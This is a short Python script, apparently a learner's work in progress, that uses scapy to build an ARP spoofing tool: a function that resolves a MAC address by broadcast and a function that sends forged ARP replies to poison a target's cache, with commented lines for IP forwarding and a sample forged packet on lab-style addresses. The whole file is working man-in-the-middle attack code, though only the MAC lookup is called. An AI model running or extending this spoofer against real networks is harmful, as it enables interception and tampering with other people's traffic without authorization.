#!/usr/bin/env

import scapy.all as scapy

# packet = scapy.ARP(op=2, pdst="10.0.2.3", hwdst="08:00:27:b6:66:d6", psrc=" 10.0.2.1")
# print(packet.show())
# print(packet.summary())










# echo 1 > /procs/sys/net/ipv4/ip_forward
# scapy.send(packet)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

    
get_mac("10.0.2.1")